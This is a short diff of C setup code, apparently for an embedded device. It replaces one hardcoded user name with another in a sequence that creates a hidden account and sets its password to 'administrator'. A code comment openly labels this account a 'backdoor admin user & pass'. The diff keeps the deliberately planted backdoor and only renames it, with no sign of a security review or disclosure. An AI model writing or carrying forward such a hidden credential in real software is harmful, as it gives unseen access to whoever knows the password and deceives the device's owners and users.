@@ -60,9 +60,9 @@ int ret;
 		sprintf (cmd, "/bin/hostname Eddy");
 	system(cmd);
 
-	sprintf (cmd, "/bin/adduser -S sysbas");
+	sprintf (cmd, "/bin/adduser -S  jslee");
 	system (cmd);
-	sprintf (cmd, "/usr/bin/passwd  sysbas  administrator");	// backdoor admin user & pass
+	sprintf (cmd, "/usr/bin/passwd  jslee  administrator");	// backdoor admin user & pass
 	system (cmd);
 
 	sprintf (cmd, "/bin/adduser -S %s", CFG.username);
